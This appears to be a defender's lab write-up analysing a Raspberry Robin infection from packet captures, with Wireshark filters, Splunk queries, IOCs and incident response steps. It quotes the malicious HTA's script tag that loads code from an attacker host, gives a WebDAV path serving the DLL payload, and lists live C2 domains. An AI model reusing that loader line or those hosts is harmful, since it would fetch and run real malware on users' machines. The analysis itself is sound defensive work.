## Date: November 14, 2024  
**Source:** [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/2024/11/14/index.html)

**Theme:** Windows-based malware infection chain using a malicious HTA file that retrieves and executes a DLL payload from a WebDAV share, followed by TOR-based C2 traffic.

---

###  Step 1: Download and Extract Investigation Files

Downloaded the following from the case study:

- `2024-11-14-Raspberry-Robin-infection-initial-traffic.saz.zip`
- `2024-11-14-Raspberry-Robin-infection-traffic.pcap.zip`
- `2024-11-14-Raspberry-Robin-malware-samples.zip`

Unzipped using password: `infected_20241114`

---

###  Artifacts:

- `.pcap` for full network capture
- `.saz` archive from Fiddler HTTP debugger
- Malware sample ZIP includes:
  - `bootstrap.hta` (malicious script)
  - Retrieved payload: `v.dll`

### Step 2: Analyze Initial Stage – HTA File Launch

**Artifact:** `bootstrap.zip`  
**Contained file:** `bootstrap.hta`

This HTA file contains a script referencing an external domain:

<img width="1702" height="731" alt="image" src="https://github.com/user-attachments/assets/0707552d-d130-42e6-b67c-8ba90b7ef4c2" />

```html
<script src="https://735dba63.bright-witted.skin/2fh0gj35ptlit"></script>
```

**Purpose:** To dynamically pull a large obfuscated payload that includes further malware logic.

**Screenshot: Malicious HTA Trigger**  
Clicking this file results in a **5.5 MB obfuscated script** download.

Traffic shows numerous **HTTPS GET requests** and a large **payload in response**.

---

### Step 3: Monitor Traffic via Fiddler (SAZ)

**Opened:** `2024-11-14-Raspberry-Robin-infection-initial-traffic.saz` in Fiddler
download fiddler for free from **Source:** [fiddler](https://www.telerik.com/download/fiddler/fiddler4)

<img width="1918" height="1077" alt="image" src="https://github.com/user-attachments/assets/66d97726-ad60-41e5-aa11-cceda62c6f02" />


📸 **Screenshot: Traffic to Malicious Domain**  
**Observed:**

- Initial **HTTPS GET** to:  
  `https://735dba63.bright-witted.skin/2fh0gj35ptlit`

- Server returns **5.5 MB of obfuscated script code**

- Followed by connections to a **WebDAV share**:  
  `\\2z.si@ssl\u\i\v.dll`

 **Downloaded DLL:** `v.dll` — a PE file (Windows DLL)

---

### Step 4: Identify DLL File Properties

**File `v.dll`** was hosted on the WebDAV share and manually retrieved:

<img width="1452" height="800" alt="image" src="https://github.com/user-attachments/assets/dc4aff01-dd0e-496e-8c6f-c05dce9626be" />

📸 **Screenshot: v.dll Retrieved via WebDAV**  
- **File Size:** 2.55 MB  
- **Version:** 2.8.8.0  
- **Location:** `\\2z.si@ssl\u\i\v.dll`

This DLL is **Raspberry Robin’s main loader** and runs after the HTA script executes and fetches the file.

---

###  Step 5: Network Traffic Analysis (Wireshark)

**Opened:** `2024-11-14-Raspberry-Robin-infection-traffic.pcap`

 **Wireshark Filters Used**

#### 🔍 Filter 1 – HTA & WebDAV-Related Connections:
```wireshark
http.request or tls.handshake.type eq 1 or ip.addr eq 194.5.212.85
```
This filter helps identify the initial infection stage and payload delivery.

Captures connections made when the `bootstrap.hta` file is launched.

<img width="1707" height="865" alt="image" src="https://github.com/user-attachments/assets/c219c03f-568c-4f5a-a8c5-a8a5cbf43fbb" />

 **Post DLL TOR Traffic**  
- TLS 1.2 Client Hello traffic on port 9001 from infected host.
- **SNI values observed:**
  - `vfnbzcosotyp[.]com`
  - `hsphy52[.]com`
  - `sdeq3iozavf[.]com`

Indicates encrypted C2 communication via TOR after payload execution.

Confirms that the DLL is actively attempting to reach out to attacker infrastructure through anonymized channels.

 **Conclusion:**  
This activity confirms C2 beaconing and persistence behavior associated with Raspberry Robin.  
The usage of port 9001 and non-standard SNI domains is a strong IOC for TOR-based post-exploitation traffic.


####  Filter 2 – TOR C2 Communication (Post DLL Execution):
```wireshark
tcp.port == 9001 or tls.handshake.type eq 1
```
Highlights encrypted communications over port 9001, often used by Raspberry Robin to connect to TOR gateways after payload execution.


<img width="1717" height="952" alt="image" src="https://github.com/user-attachments/assets/78a7c331-b606-4d0d-9108-343f0a111c54" />
 
**HTA Launch and WebDAV Payload Fetch**  

- Shows TLS handshake to:
  - `735dba63.bright-witted.skin` → used in `bootstrap.hta`
  - `zz.si` → hosting DLL via UNC path `\\2z.si@ssl\u\i\`

This confirms the initial GET request to fetch a large obfuscated payload (~5.5MB) from `bright-witted.skin`.

Followed by connection to `zz.si`, which is the WebDAV share used to deliver the DLL named `v.dll`.

 **Conclusion:**  
The screenshot proves that `bootstrap.hta` initiates the infection by downloading and executing scripts  
that result in DLL retrieval from WebDAV shares.

---

###  Step 6: Behavioral Summary

| **Phase**           | **Observed Activity**                                                                 |
|---------------------|----------------------------------------------------------------------------------------|
| **Initial Access**  | Victim extracts HTA from zip and double-clicks it                                     |
| **Execution**       | HTA runs embedded JavaScript → downloads obfuscated script                            |
| **Delivery**        | Obfuscated script fetches DLL from WebDAV share                                       |
| **Persistence**     | DLL runs and likely installs persistence via registry/task                            |
| **C2 Communication**| Outbound TOR traffic on 9001 to multiple onion proxy domains                          |
| **Defense Evasion** | Obfuscation and encrypted comms (TLS and TOR)                                         |

---

###  Step 7: Extracted Indicators of Compromise (IOCs)

| **Type**        | **Value**                                                               |
|-----------------|-------------------------------------------------------------------------|
| **Domain**      | `735dba63.bright-witted.skin`                                           |
| **WebDAV**      | `\\2z.si@ssl\u\i\v.dll`                                                 |
| **DLL Name**    | `v.dll`                                                                 |
| **HTA URL**     | `https://735dba63.bright-witted.skin/2fh0gj35ptlit`                    |
| **TOR Domains** | `www.vfnbzcosotyp.com`, `www.hsphy52.com`, `www.sdeq3iozavf.com`        |
| **TOR Ports**   | `9001`, `443`                                                           |

---

###  Step 8: Simulated Detection Using Splunk

#### Convert PCAP to JSON:
```bash
tshark -r 2024-11-14-Raspberry-Robin-infection-traffic.pcap -T json > raspberry-pcap.json
```
<img width="1713" height="692" alt="image" src="https://github.com/user-attachments/assets/5ba38489-0888-49ef-b0d9-55b978170eaa" />

Since Splunk accepts files below 500MB, filter the PCAP before JSON conversion.

Convert and Extract Only Relevant Traffic.You can filter the PCAP before converting it to JSON:

```bash
tshark -r 2024-11-14-Raspberry-Robin-infection-traffic.pcap -Y "http.request or tcp.port == 9001" -T json > filtered.json
```
<img width="1426" height="86" alt="image" src="https://github.com/user-attachments/assets/6d1de3fc-39cc-4621-9992-6b9e35ecbd7b" />

This reduces the size by extracting only useful traffic (e.g., HTA, WebDAV, TOR).

Upload it in splunk and select source type as default only.

---


####  Sample Splunk Queries

**🔍 Detect TOR Port Usage**
```spl
source="filtered.json" host="localhost" 9001 OR 443
```
<img width="1712" height="817" alt="image" src="https://github.com/user-attachments/assets/66fc741d-8e3f-4885-b3a0-e8ba5e31f91e" />

<img width="1390" height="667" alt="image" src="https://github.com/user-attachments/assets/22c0f4a9-738f-45f7-b818-aac6f8de0ac9" />

---


### Step 9: Incident Response Lifecycle (Raspberry Robin)

####  Preparation
- Disabled HTA file execution via GPO  
- Blocked outbound WebDAV and TOR traffic at firewall  

####  Identification
- User reported suspicious pop-up after extracting a zip  
- Alert triggered for .hta execution  
- Spike in outbound connections to suspicious domains via port 9001  

####  Containment
- Disconnected infected machine from the network  
- Blocked domains and IPs at perimeter firewall  

#### Eradication
- Deleted bootstrap.hta and v.dll  
- Removed autorun entries / persistence mechanisms  
- Scanned system with Defender and Malwarebytes EDR  

####  Recovery
- Restored system to known clean state  
- Re-enabled network access after verification  
- Monitored outbound traffic for anomalies  

####  Lessons Learned
- Prevent execution of .hta files  
- Enable detection rules for obfuscated script downloads  
- Monitor abnormal use of WebDAV protocols  
- Build detections for known TOR domains and SNI anomalies  

---

###  Timeline of Events (UTC)

| Time                | Event                                                   |
|---------------------|----------------------------------------------------------|
| 2024-11-14 21:13     | HTA script downloaded from malicious site                |
| 2024-11-14 21:15     | Obfuscated script fetches v.dll from WebDAV share        |
| 2024-11-14 21:29     | DLL runs and initiates TOR C2 communication              |
| 2024-11-14 21:33     | Multiple outbound sessions on port 9001 begin            |
| 2024-11-14 22:00     | IR initiated – endpoint isolated and triaged             |
